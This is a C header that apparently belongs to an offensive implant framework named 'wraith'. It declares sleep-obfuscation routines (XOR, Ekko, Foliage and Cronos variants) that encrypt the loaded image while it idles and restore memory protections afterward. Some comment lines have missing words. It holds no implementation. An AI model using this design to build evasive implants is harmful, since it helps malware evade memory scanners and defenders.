/*
 * src/stealth/sleep/sleep.h
 *
 * Sleep obfuscation orchestrator. The public entry point
 * (wraith_sleep, declared in wr_stealth.h) delegates here. The
 * dispatcher chooses an algorithm by ctx->sleep_algo:
 *  - WRAITH_SLEEP_XOR  : single-thread RDTSC-keyed XOR *  - WRAITH_SLEEP_EKKO  : aliased to XOR for ; swaps
 *  in timer-queue + CONTEXT-driven version
 *  - WRAITH_SLEEP_FOLIAGE : currently aliased to XOR (+)
 *  - WRAITH_SLEEP_CRONOS  : - NtContinue + APC chain
 */

#ifndef WRAITH_SLEEP_H
#define WRAITH_SLEEP_H

#include "core/wr_context_internal.h"
#include "wraith/wraith_status.h"

#ifdef __cplusplus
extern "C" {
#endif

/* Drive a sleep cycle (encrypt -> wait -> decrypt) for `duration_ms`. */
wraith_status_t wr_sleep_obfuscate(struct wr_ctx *ctx, uint32_t duration_ms);

/* XOR-baseline implementation. Used directly by the dispatcher when
 * sleep_algo == WRAITH_SLEEP_XOR; reused by other algorithms as the
 * encrypt primitive. */
wraith_status_t wr_sleep_xor_cycle(struct wr_ctx *ctx, uint32_t duration_ms);

/* Cronos-flavor implementation. Encrypt synchronously; decrypt deferred
 * to a CreateTimerQueueTimer worker thread; calling thread parks in
 * NtWaitForSingleObject until the worker signals. */
wraith_status_t wr_sleep_cronos_cycle(struct wr_ctx *ctx, uint32_t duration_ms);

/* Walk the loaded image's section table and re-apply per-section
 * protections derived from `Characteristics`. Used after decrypt to
 * restore the same RX/R/RW state FinalizeSections produced at load. */
wraith_status_t wr_sleep_reapply_section_protections(struct wr_ctx *ctx);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_SLEEP_H */
